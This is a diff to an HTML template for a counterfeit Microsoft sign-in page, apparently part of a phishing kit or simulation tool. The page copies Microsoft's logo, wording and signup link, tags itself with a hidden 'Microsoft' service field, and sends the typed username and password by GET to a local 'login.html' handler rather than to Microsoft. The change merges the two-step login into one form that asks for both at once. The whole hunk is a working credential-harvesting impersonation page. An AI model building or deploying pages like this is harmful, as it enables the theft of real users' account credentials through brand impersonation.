@@ -25,47 +25,27 @@
         <form class="microsoft-form" action="../login.html" method="GET">
           <input type="hidden" name="_service" value="Microsoft" />
 
-          <!-- form logo -->
           <div class="microsoft-logo">
             <img src="microsoft-logo.svg" alt="Microsoft" />
           </div>
 
-          <!-- username selected heading -->
-          <div class="microsoft-welcome fade-in">
-            <button type="button"><img src="arrow.png" alt="Back" /></button>
-            <span>...</span>
+          <h2 class="microsoft-heading">
+            <span>Sign in</span>
+          </h2>
+
+          <div class="microsoft-input">
+            <input type="text" name="_username" placeholder="Email, phone, or Skype" value="" />
           </div>
 
-          <!-- username slide -->
-          <div class="microsoft-username microsoft-slide slide-right">
-            <h2>Sign in</h2>
-            <div class="microsoft-input">
-              <input type="text" name="_username" placeholder="Email, phone, or Skype" value="" />
-            </div>
+          <div class="microsoft-input">
+            <input type="password" name="_password" placeholder="Password" value="" />
+            <a href="#">Forgot password</a>
+          </div>
+
+          <div class="microsoft-bottom">
             <div class="microsoft-signup">
               <span>No account?</span>
               <a href="https://signup.live.com/signup">Create one!</a>
-            </div>
-            <div class="microsoft-options">
-              <a href="#">Sign-in options</a>
-            </div>
-            <div class="microsoft-action">
-              <button type="submit">Next</button>
-            </div>
-          </div>
-
-          <!-- hidden password input -->
-          <div class="microsoft-password microsoft-slide slide-left hidden">
-            <h2>Enter password</h2>
-            <div class="microsoft-input">
-              <input type="password" name="_password" placeholder="Password" value="" />
-            </div>
-            <div class="microsoft-remember">
-              <input type="checkbox" name="_remember" checked />
-              <span>Keep me signed in</span>
-            </div>
-            <div class="microsoft-forgot">
-              <a href="#">Forgot my password</a>
             </div>
             <div class="microsoft-action">
               <button type="submit">Sign in</button>
